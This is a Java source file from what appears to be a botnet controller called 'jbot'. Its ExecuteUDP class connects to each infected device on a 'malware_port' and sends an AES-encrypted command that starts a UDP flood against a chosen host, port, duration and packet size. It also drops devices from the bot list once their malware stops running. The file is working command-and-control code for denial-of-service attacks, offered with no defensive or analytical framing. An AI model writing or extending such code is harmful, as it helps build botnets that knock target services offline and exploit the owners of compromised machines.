package me.aaronakhtar.jbot.threads.execute.threads;

import me.aaronakhtar.jbot.JBot;
import me.aaronakhtar.jbot.Options;
import me.aaronakhtar.jbot.crypto.Aes;
import me.aaronakhtar.jbot.objects.Device;
import me.aaronakhtar.jbot.utils.Colour;

import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ExecuteUDP implements Runnable{

    private String host;
    private int port;
    private int time;
    private int bytes_per_packet;
    private Device device;

    public ExecuteUDP(String host, int port, int time, int bytes_per_packet, Device device) {
        this.host = host;
        this.port = port;
        this.time = time * 1000;
        this.bytes_per_packet = bytes_per_packet;
        this.device = device;
    }

    @Override
    public void run() {
        try{
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(device.getInetAddress(), Options.malware_port), 5000);
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            writer.println(Aes.encrypt("udp " + host + ":" + port + ":" + time + ":" + bytes_per_packet, Options.secret_key));
            writer.flush();
            writer.close();
        }catch (Exception e){
            if (JBot.isUnderDev){
                e.printStackTrace();
            }

            if (!device.isMalwareRunning()){
                JBot.devices.remove(device);
            }
        }
    }
}
